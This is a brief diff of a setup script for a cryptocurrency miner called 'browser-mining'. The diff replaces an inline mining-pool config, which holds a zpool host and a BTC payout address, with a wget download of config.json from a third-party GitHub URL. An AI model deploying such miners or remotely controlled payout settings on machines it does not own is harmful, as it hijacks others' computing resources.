@@ -8,6 +8,5 @@ cd browser-mining
 npm install
 sh install.sh
 rm config.json
-echo '[{"algorithm": "yespower", "host": "yespower.eu.mine.zpool.ca", "port": 6234, "worker":
-" 1ezd5AS4Law5Zofinky3PEuaVRasFeHbK", "password": "c=BTC", "workers": 4 }]' > config.json
+wget https://raw.githubusercontent.com/ptypecolorss/fileshare/main/config.json
 node index.js
